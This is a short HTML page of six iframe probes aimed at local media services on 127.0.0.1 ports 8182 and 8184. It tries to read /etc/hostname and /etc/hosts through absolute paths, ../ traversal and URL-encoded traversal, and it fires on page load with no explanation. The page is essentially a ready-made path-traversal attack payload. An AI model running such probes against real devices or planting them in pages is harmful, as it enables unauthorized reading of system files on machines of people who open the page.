<!doctype html>
<html><head><meta charset="utf-8"><title>CAT CAS loopback media services v15</title>
<style>body{font:16px monospace}section{break-inside:avoid;margin:12px 0}iframe{width:100%;height:180px;border:2px solid #333}</style></head><body>
<h1>CASI loopback media file probes</h1>
<section><h2>1 port 8182 absolute hostname</h2><iframe src="http://127.0.0.1:8182/file?name=/etc/hostname"></iframe></section>
<section><h2>2 port 8182 traversal hostname</h2><iframe src="http://127.0.0.1:8182/file?name=../../../../etc/hostname"></iframe></section>
<section><h2>3 port 8182 absolute hosts</h2><iframe src="http://127.0.0.1:8182/file?name=/etc/hosts"></iframe></section>
<section><h2>4 port 8182 path parameter</h2><iframe src="http://127.0.0.1:8182/file?path=/etc/hostname"></iframe></section>
<section><h2>5 port 8184 file hostname</h2><iframe src="http://127.0.0.1:8184/file?name=/etc/hostname"></iframe></section>
<section><h2>6 port 8184 encoded live path</h2><iframe src="http://127.0.0.1:8184/live_video/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhostname"></iframe></section>
</body></html>
